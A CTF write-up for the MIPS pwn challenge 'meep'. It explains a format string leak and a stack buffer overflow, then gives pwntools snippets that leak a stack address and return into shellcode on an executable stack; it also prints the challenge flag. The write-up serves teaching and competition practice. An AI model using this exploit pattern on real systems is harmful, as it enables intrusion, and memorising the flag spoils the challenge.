# meep

## 1. Summary

- **Category**: Pwn
- **Points**: 51
- **Solves**: 247

### Description

> `The big Meep listens and waits. All it asks for is a name and a command...`

## 2. Analysis

### Vulnerability

- The program contains both a format string vulnerability and a buffer overflow vulnerability.

From `main()`, we can see that it calls `greet(puts)` and `diagnostics()`:

```c
greet(puts);
diagnostics();
```

Inside `greet()`:

```c
send(1,"Enter admin name: ",0x12,0);
recv(0,name,0x100,0);
(*puts)("\nHello:\n");
printf(name);
```

The user input is directly used as the format string in `printf`, leading to a format string vulnerability. This allows us to leak memory addresses.

Next, in `diagnostics()`:

```c
char cmd[128];

send(1,"Enter diagnostic command:\n",0x1b,0);
recv(0,cmd,0x100,0);
send(1,"Running command...\n",0x13,0);
```

Here, a buffer overflow occurs because `recv` reads up to 0x100 bytes into a 128-byte buffer.

Since this is a MIPS architecture, the return address is stored in the `ra` register. Although we cannot directly overwrite `ra`, it is saved onto the stack during function calls. By locating and modifying the saved `ra` on the stack, we can control the return address when `diagnostics()` finishes and execution returns to `main()`.

Additionally, the stack has RWX permissions:

```text
Start      End        Offset     Perm Path
0x2aaac000 0x2b2ac000 0x00000000 rwx [stack]
```

This allows us to execute shellcode directly on the stack.

## 3. Exploit Flow

1. **Leaking Stack Address via Format String**

   ```python
   payload = b"%40$p\n"
   r.sendafter(b"name: ", payload)
   r.recvuntil(b"Hello:\n\n")
   stack_leak = int(r.recvline().decode().strip(), 16)
   ```

   Using the format string vulnerability, we identify the correct index and leak a stack address with `%40$p`.

2. **Buffer Overflow and ret2shellcode**

   ```python
   shellcode = asm(shellcraft.sh())
   payload = shellcode.rjust(0x8C, b"\0")
   payload += p32(stack_leak - 0x90)
   ```

   We place shellcode on the stack and overwrite the saved return address with the start of the shellcode. Since the stack is executable, this results in a shell.

## 4. Final Solution

- **Exploit Code**: [Link to Script / GitHub](./solve.py)

## 5. Flag

`gigem{m33p_m1p_1_n33d_4_m4p}`
